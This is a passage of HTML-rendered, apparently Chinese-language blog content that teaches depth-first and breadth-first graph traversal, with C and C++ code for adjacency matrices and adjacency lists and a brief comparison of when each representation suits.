class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxInt 32767   <span class="hljs-comment">//有向表的正无穷</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MVNum 100       <span class="hljs-comment">//最大定点数</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> VerTexType;   <span class="hljs-comment">//定点的类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ArcType;      <span class="hljs-comment">//权值</span><br>  <br>  <br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">AMGraph</span> &#123;</span><br>    VerTexType vexs[MVNum];   <span class="hljs-comment">//顶点表</span><br>    ArcType arcs[MVNum][MVNum];   <span class="hljs-comment">//邻接矩阵</span><br>    <span class="hljs-type">int</span> vexnum, arcnum;<span class="hljs-comment">//图的当前点数和边的数目</span><br>&#125; AMGraph;<br>  <br>  <br>  <br><span class="hljs-type">void</span> <span class="hljs-title function_">creatGraph</span><span class="hljs-params">(AMGraph **amGraph)</span> &#123;<br>    *amGraph = (AMGraph *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(AMGraph));<br>    (*amGraph)-&gt;vexnum = <span class="hljs-number">0</span>;<br>    (*amGraph)-&gt;arcnum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; ++i) &#123;<br>        (*amGraph)-&gt;vexs[i] = <span class="hljs-string">&#x27;A&#x27;</span> + i;<br>        (*amGraph)-&gt;vexnum++;<br>  <br>    &#125;<br>    <span class="hljs-comment">//创建邻接矩阵</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">6</span>; ++j) &#123;<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;(*amGraph)-&gt;arcs[i][j]);<br>            <span class="hljs-keyword">if</span> ((*amGraph)-&gt;arcs[i][j] == <span class="hljs-number">1</span>) &#123;<br>                (*amGraph)-&gt;arcnum++;<br>            &#125;<br>        &#125;<br>    &#125;<br>    (*amGraph)-&gt;arcnum /= <span class="hljs-number">2</span>;<span class="hljs-comment">//无向边</span><br>  <br>&#125;<br>  <br><span class="hljs-comment">//邻接矩阵</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">DFS</span><span class="hljs-params">(AMGraph *amGraph, <span class="hljs-type">int</span> visited[],<span class="hljs-type">int</span> sub)</span> &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,amGraph-&gt;vexs[sub]);<br>    visited[sub]=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; amGraph-&gt;vexnum; ++i) &#123;<br>        <span class="hljs-keyword">if</span> (amGraph-&gt;arcs[sub][i]!=<span class="hljs-number">0</span>&amp;&amp;visited[i]==<span class="hljs-number">0</span>)&#123;<br>            DFS(amGraph,visited,i);<br>        &#125;<br>    &#125;<br>&#125;<br>  <br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    AMGraph *amGraph;<span class="hljs-comment">//邻接表</span><br>    <span class="hljs-type">int</span> ints[<span class="hljs-number">6</span>] = &#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-comment">//在搜索中，记录是否别查看</span><br>    creatGraph(&amp;amGraph);<span class="hljs-comment">//创建邻接矩阵</span><br>    DFS(amGraph,ints,<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>  <br></code></pre></td></tr></table></figure></li></ul><h4 id="邻接表"><a href="#邻接表" class="headerlink" title="邻接表"></a><strong>邻接表</strong></h4><ul><li><p>代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br>  <br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxInt 32767   <span class="hljs-comment">//有向表的正无穷</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MVNum 100       <span class="hljs-comment">//最大定点数</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> VerTexType;   <span class="hljs-comment">//定点的类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ArcType;      <span class="hljs-comment">//权值</span><br>  <br>  <br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">AMGraph</span> &#123;</span><br>    VerTexType vexs[MVNum];   <span class="hljs-comment">//顶点表</span><br>    ArcType arcs[MVNum][MVNum];   <span class="hljs-comment">//邻接矩阵</span><br>    <span class="hljs-type">int</span> vexnum, arcnum;<span class="hljs-comment">//图的当前点数和边的数目</span><br>&#125; AMGraph;<br>  <br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> // 边表节点</span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> adjvex; <span class="hljs-comment">// 与顶点相连的邻接点下标(adjoin：邻接)</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> *<span class="hljs-title">next</span>;</span> <span class="hljs-comment">// 指向顶点的下一个邻接点</span><br>&#125; EdgeNode;<br>  <br>  <br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vnode</span>       // 顶点结构</span><br><span class="hljs-class">&#123;</span><br>    VerTexType vex;      <span class="hljs-comment">// 存储顶点名</span><br>    EdgeNode *firstedge; <span class="hljs-comment">// 边表头指针，指向顶点第一个邻接点</span><br>&#125; VertexNode, AdjList[MVNum];<br>  <br><span class="hljs-type">void</span> <span class="hljs-title function_">creatGraph</span><span class="hljs-params">(AMGraph **amGraph)</span> &#123;<br>    *amGraph = (AMGraph *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(AMGraph));<br>    (*amGraph)-&gt;vexnum = <span class="hljs-number">0</span>;<br>    (*amGraph)-&gt;arcnum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; ++i) &#123;<br>        (*amGraph)-&gt;vexs[i] = <span class="hljs-string">&#x27;A&#x27;</span> + i;<br>        (*amGraph)-&gt;vexnum++;<br>  <br>    &#125;<br>    <span class="hljs-comment">//创建邻接矩阵</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">6</span>; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">6</span>; ++j) &#123;<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;(*amGraph)-&gt;arcs[i][j]);<br>            <span class="hljs-keyword">if</span> ((*amGraph)-&gt;arcs[i][j] == <span class="hljs-number">1</span>) &#123;<br>                (*amGraph)-&gt;arcnum++;<br>            &#125;<br>        &#125;<br>    &#125;<br>    (*amGraph)-&gt;arcnum /= <span class="hljs-number">2</span>;<br>  <br>&#125;<br>  <br><span class="hljs-type">void</span> <span class="hljs-title function_">creatAdjacencyList</span><span class="hljs-params">(AMGraph *amGraph, AdjList adjList)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; amGraph-&gt;vexnum; ++i) &#123;<br>        adjList[i].vex = amGraph-&gt;vexs[i];<br>        adjList[i].firstedge = <span class="hljs-literal">NULL</span>;<br>        EdgeNode *moveNode = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; amGraph-&gt;vexnum; ++j) &#123;<br>            <span class="hljs-comment">//下面就是创建链表的过程，只是在第一个的时候相当于创建头节点</span><br>            <span class="hljs-keyword">if</span> (amGraph-&gt;arcs[i][j] == <span class="hljs-number">1</span>) &#123;<span class="hljs-comment">//=1说明连同</span><br>                <span class="hljs-keyword">if</span> (adjList[i].firstedge == <span class="hljs-literal">NULL</span>) &#123;<br>                    adjList[i].firstedge=(EdgeNode *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span> (<span class="hljs-keyword">struct</span> node));<br>                    adjList[i].firstedge-&gt;adjvex = j;<br>                    adjList[i].firstedge-&gt;next=<span class="hljs-literal">NULL</span>;<br>                    moveNode = adjList[i].firstedge;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    EdgeNode *tem=(EdgeNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(EdgeNode));<br>                    tem-&gt;adjvex=j;<br>                    tem-&gt;next=<span class="hljs-literal">NULL</span>;<br>                    moveNode-&gt;next=tem;<br>                    moveNode=moveNode-&gt;next;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br>  <br><span class="hljs-comment">//邻接矩阵</span><br><span class="hljs-comment">/*void DFS(AMGraph *amGraph, int visited[],int sub) &#123;</span><br><span class="hljs-comment">    printf(&quot;%c&quot;,amGraph-&gt;vexs[sub]);</span><br><span class="hljs-comment">    visited[sub]=1;</span><br><span class="hljs-comment">    for (int i = 0; i &lt; amGraph-&gt;vexnum; ++i) &#123;</span><br><span class="hljs-comment">        if (amGraph-&gt;arcs[sub][i]!=0&amp;&amp;visited[i]==0)&#123;</span><br><span class="hljs-comment">            DFS(amGraph,visited,i);</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">&#125;*/</span><br>  <br>  <br><span class="hljs-comment">//邻接表</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">DFS</span><span class="hljs-params">(AdjList adjList,<span class="hljs-type">int</span> ints[],<span class="hljs-type">int</span> sub)</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>,adjList[sub].vex);<br>    ints[sub]=<span class="hljs-number">1</span>;<br>    EdgeNode *moveNode=adjList[sub].firstedge;<br>    <span class="hljs-keyword">while</span>(moveNode!=<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">if</span>(ints[moveNode-&gt;adjvex]==<span class="hljs-number">0</span>)&#123;<br>            DFS(adjList,ints,moveNode-&gt;adjvex);<br>        &#125;<br>        moveNode=moveNode-&gt;next;<br>    &#125;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    AMGraph *amGraph;<span class="hljs-comment">//邻接表</span><br>    AdjList adjList=&#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-comment">//邻接表的点集合，全部初始化</span><br>    <span class="hljs-type">int</span> ints[<span class="hljs-number">6</span>] = &#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-comment">//在搜索中，记录是否别查看</span><br>    creatGraph(&amp;amGraph);<span class="hljs-comment">//创建邻接矩阵</span><br>    creatAdjacencyList(amGraph,adjList);<span class="hljs-comment">//创建邻接表</span><br>    DFS(adjList,ints,<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>  <br></code></pre></td></tr></table></figure></li></ul><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h4><p>稠密图适用于邻接矩阵上进行深度遍历</p><p>稀疏图适用于在邻接表上深度遍历</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%9B%BE/DFS%E7%AE%97%E6%B3%95%E6%95%88%E7%8E%87%E5%88%86%E6%9E%90.png"></p><h4 id="非连通图"><a href="#非连通图" class="headerlink" title="非连通图"></a>非连通图</h4><ol><li>可以想象成两个图，然后增加一个虚拟节点，将图穿起来</li><li>如果图的数量不是2个，那就只能在非第一次遍历的图中再选一个图的随机的一个节点开始遍历</li></ol><h3 id="广度优先搜索（BFS）"><a href="#广度优先搜索（BFS）" class="headerlink" title="广度优先搜索（BFS）"></a>广度优先搜索（BFS）</h3><h4 id="邻接矩阵-1"><a href="#邻接矩阵-1" class="headerlink" title="邻接矩阵"></a>邻接矩阵</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxInt 32767   <span class="hljs-comment">//有向表的正无穷</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MVNum 100       <span class="hljs-comment">//最大定点数</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> VerTexType;   <span class="hljs-comment">//定点的类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ArcType;      <span class="hljs-comment">//权值</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">AMGraph</span> &#123;<br>    VerTexType vexs[MVNum];   <span class="hljs-comment">//顶点表</span><br>    ArcType arcs[MVNum][MVNum];   <span class="hljs-comment">//邻接矩阵</span><br>    <span class="hljs-type">int</span> vexnum, arcnum;<span class="hljs-comment">//图的当前点数和边的数目</span><br>&#125; AMGraph, *pAMGraph;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">creatGraph</span><span class="hljs-params">(pAMGraph &amp;amGraph, <span class="hljs-type">int</span> num)</span> </span>&#123;<br>    amGraph = <span class="hljs-keyword">new</span> AMGraph;<br>    amGraph-&gt;arcnum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        amGraph-&gt;vexs[i] = <span class="hljs-string">&#x27;A&#x27;</span> + i;<br>    &#125;<br>    amGraph-&gt;vexnum = num;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; num; ++j) &#123;<br>            cin &gt;&gt; amGraph-&gt;arcs[i][j];<br>            <span class="hljs-keyword">if</span> (amGraph-&gt;arcs[i][j] != <span class="hljs-number">0</span>) &#123;<br>                amGraph-&gt;arcnum++;<span class="hljs-comment">//计算边数</span><br>            &#125;<br>        &#125;<br>    &#125;<br>    amGraph-&gt;arcnum /= <span class="hljs-number">2</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">BFS</span><span class="hljs-params">(pAMGraph amGraph, <span class="hljs-type">int</span> ints[], <span class="hljs-type">int</span> sub)</span> </span>&#123;<br>    queue&lt;<span class="hljs-type">int</span>&gt; queue;<br>    queue.<span class="hljs-built_in">push</span>(sub);<span class="hljs-comment">//先push，进入循环，但是记得在ints里面标记被push</span><br>    ints[sub]=<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (!queue.<span class="hljs-built_in">empty</span>()) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; amGraph-&gt;vexnum; ++i) &#123;<br>            <span class="hljs-keyword">if</span> (amGraph-&gt;arcs[queue.<span class="hljs-built_in">front</span>()][i] == <span class="hljs-number">1</span>&amp;&amp;ints[i]==<span class="hljs-number">0</span>) &#123;<br>                queue.<span class="hljs-built_in">push</span>(i);<br>                ints[i]=<span class="hljs-number">1</span>;<br>            &#125;<br>        &#125;<br>        cout&lt;&lt;amGraph-&gt;vexs[queue.<span class="hljs-built_in">front</span>()];<br>        queue.<span class="hljs-built_in">pop</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    pAMGraph amGraph = <span class="hljs-literal">nullptr</span>;<br>    <span class="hljs-type">int</span> num;<br>    cin &gt;&gt; num;<span class="hljs-comment">//输入节点数</span><br>    <span class="hljs-built_in">creatGraph</span>(amGraph, num);<br>    <span class="hljs-type">int</span> *ints=<span class="hljs-keyword">new</span> <span class="hljs-type">int</span>[num];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        *(ints+i)=<span class="hljs-number">0</span>;<br>    &#125;<span class="hljs-comment">//将被查看表全部设为0</span><br>    <span class="hljs-built_in">BFS</span>(amGraph, ints, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">delete</span>[] ints;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="邻接表-1"><a href="#邻接表-1" class="headerlink" title="邻接表"></a>邻接表</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><code class="hljs c">    <span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MaxInt 32767   <span class="hljs-comment">//有向表的正无穷</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MVNum 100       <span class="hljs-comment">//最大定点数</span></span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">char</span> VerTexType;   <span class="hljs-comment">//定点的类型</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">int</span> ArcType;      <span class="hljs-comment">//权值</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">AMGraph</span> &#123;</span><br>    VerTexType vexs[MVNum];   <span class="hljs-comment">//顶点表</span><br>    ArcType arcs[MVNum][MVNum];   <span class="hljs-comment">//邻接矩阵</span><br>    <span class="hljs-type">int</span> vexnum, arcnum;<span class="hljs-comment">//图的当前点数和边的数目</span><br>&#125; AMGraph;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> // 边表节点</span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> adjvex; <span class="hljs-comment">// 与顶点相连的邻接点下标(adjoin：邻接)</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span> *<span class="hljs-title">next</span>;</span> <span class="hljs-comment">// 指向顶点的下一个邻接点</span><br>&#125; EdgeNode;<br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">vnode</span>       // 顶点结构</span><br><span class="hljs-class">&#123;</span><br>    VerTexType vex;      <span class="hljs-comment">// 存储顶点名</span><br>    EdgeNode *firstedge; <span class="hljs-comment">// 边表头指针，指向顶点第一个邻接点</span><br>&#125; VertexNode, AdjList[MVNum];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">creatGraph</span><span class="hljs-params">(AMGraph **amGraph,<span class="hljs-type">int</span> num)</span> &#123;<br>    *amGraph = (AMGraph *) <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(AMGraph));<br>    (*amGraph)-&gt;vexnum = <span class="hljs-number">0</span>;<br>    (*amGraph)-&gt;arcnum = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        (*amGraph)-&gt;vexs[i] = <span class="hljs-string">&#x27;A&#x27;</span> + i;<br>        (*amGraph)-&gt;vexnum++;<br><br>    &#125;<br>    <span class="hljs-comment">//创建邻接矩阵</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; num; ++j) &#123;<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;(*amGraph)-&gt;arcs[i][j]);<br>            <span class="hljs-keyword">if</span> ((*amGraph)-&gt;arcs[i][j] == <span class="hljs-number">1</span>) &#123;<br>                (*amGraph)-&gt;arcnum++;<br>            &#125;<br>        &#125;<br>    &#125;<br>    (*amGraph)-&gt;arcnum /= <span class="hljs-number">2</span>;<br><br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">creatAdjacencyList</span><span class="hljs-params">(AMGraph *amGraph, AdjList adjList)</span> &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; amGraph-&gt;vexnum; ++i) &#123;<br>        adjList[i].vex = amGraph-&gt;vexs[i];<br>        adjList[i].firstedge = <span class="hljs-literal">NULL</span>;<br>        EdgeNode *moveNode = <span class="hljs-literal">NULL</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; amGraph-&gt;vexnum; ++j) &#123;<br>            <span class="hljs-comment">//下面就是创建链表的过程，只是在第一个的时候相当于创建头节点</span><br>            <span class="hljs-keyword">if</span> (amGraph-&gt;arcs[i][j] == <span class="hljs-number">1</span>) &#123;<span class="hljs-comment">//=1说明连同</span><br>                <span class="hljs-keyword">if</span> (adjList[i].firstedge == <span class="hljs-literal">NULL</span>) &#123;<br>                    adjList[i].firstedge=(EdgeNode *)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span> (<span class="hljs-keyword">struct</span> node));<br>                    adjList[i].firstedge-&gt;adjvex = j;<br>                    adjList[i].firstedge-&gt;next=<span class="hljs-literal">NULL</span>;<br>                    moveNode = adjList[i].firstedge;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    EdgeNode *tem=(EdgeNode*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(EdgeNode));<br>                    tem-&gt;adjvex=j;<br>                    tem-&gt;next=<span class="hljs-literal">NULL</span>;<br>                    moveNode-&gt;next=tem;<br>                    moveNode=moveNode-&gt;next;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//邻接矩阵</span><br><span class="hljs-comment">/*void DFS(AMGraph *amGraph, int visited[],int sub) &#123;</span><br><span class="hljs-comment">    